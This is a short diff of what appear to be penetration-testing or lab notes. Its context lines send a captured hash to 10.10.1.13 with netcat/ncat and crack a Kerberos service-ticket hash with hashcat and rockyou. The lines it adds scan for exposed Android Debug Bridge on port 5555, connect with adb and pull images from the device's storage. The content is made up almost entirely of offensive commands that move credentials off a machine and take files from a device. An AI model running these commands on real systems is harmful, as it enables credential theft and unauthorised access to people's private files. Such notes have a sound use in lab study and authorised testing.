@@ -76,3 +76,8 @@ nc -lvp 9999 > hash.txt
 ncat.exe -w 3 10.10.1.13 9999< hash.txt
 
 hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt
+
+adb ->
+sudo nmap -p 5555 <IP>
+adb connect <IP:5555>
+adb pull /sdcard/DCIM/Image.jpeg <path to directory>
